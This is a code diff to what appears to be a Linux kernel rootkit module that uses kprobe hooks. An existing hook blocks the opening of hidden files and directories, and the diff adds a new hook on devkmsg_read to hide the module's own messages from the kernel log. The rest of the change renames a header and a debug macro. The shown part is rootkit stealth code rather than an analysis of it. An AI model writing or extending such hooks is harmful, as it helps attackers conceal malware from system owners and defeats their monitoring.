@@ -1,5 +1,5 @@
 #include "inc/cmds.h"
-#include "inc/hook.h"
+#include "inc/hooks.h"
 #include "inc/util.h"
 
 #include <linux/kprobes.h>
@@ -47,6 +47,9 @@ struct hook hooks[] = {
 
     // used prevent opening hidden files/dirs
     {.func = h_do_sys_openat2, .kp = {.symbol_name = "do_sys_openat2"}      },
+    
+    // used to hide ring buffer messages related to the module
+    {.func = h_devkmsg_read, .kp = {.symbol_name = "devkmsg_read"}      },
 };
 
 #define hook_count() (sizeof(hooks) / sizeof(hooks[0]))
@@ -120,13 +123,13 @@ bool hooks_install(void) {
   for (; i < hook_count(); i++) {
     h                 = &hooks[i];
     h->kp.pre_handler = __hook_pre_handler;
-
+    
     if (register_kprobe(&h->kp) != 0) {
-      debgf("failed to register kprobe for %s", h->kp.symbol_name);
+      debg("failed to register kprobe for %s", h->kp.symbol_name);
       continue;
     }
 
-    debgf("hooked %s (0x%px => 0x%px)", h->kp.symbol_name, h->kp.addr, h->func);
+    debg("hooked %s (0x%px => 0x%px)", h->kp.symbol_name, h->kp.addr, h->func);
   }
 
   return true;
@@ -139,7 +142,7 @@ void hooks_uninstall(void) {
   for (; i < hook_count(); i++) {
     h = &hooks[i];
 
-    debgf("unhooked %s (0x%px => 0x%px)", h->kp.symbol_name, h->func, h->kp.addr);
+    debg("unhooked %s (0x%px => 0x%px)", h->kp.symbol_name, h->func, h->kp.addr);
     unregister_kprobe(&h->kp);
   }
 }
